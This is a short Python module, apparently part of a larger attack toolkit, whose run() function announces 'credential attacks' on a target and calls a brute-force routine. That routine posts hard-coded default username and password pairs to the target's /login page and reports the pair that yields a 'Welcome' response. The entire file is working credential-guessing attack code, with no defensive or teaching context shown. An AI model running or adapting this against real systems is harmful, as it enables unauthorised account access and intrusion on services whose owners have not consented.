import requests
from utils.logger import setup_logger
from utils.crypto import decrypt_data
from utils.http_tools import simple_get

log = setup_logger()

def run(target, config):
    log.info(f"Running credential attacks on {target}")
    creds = brute_force_login(target)
    if creds:
        log.info(f"Valid credentials found: {creds}")
    else:
        log.info("No valid credentials found.")

def brute_force_login(target):
    """Simple brute-force attack on login page."""
    url = f"http://{target}/login"
    credentials = [("admin", "admin123"), ("user", "password123")]
    
    for username, password in credentials:
        response = requests.post(url, data={"username": username, "password": password})
        if "Welcome" in response.text:
            return f"{username}:{password}"
    return None
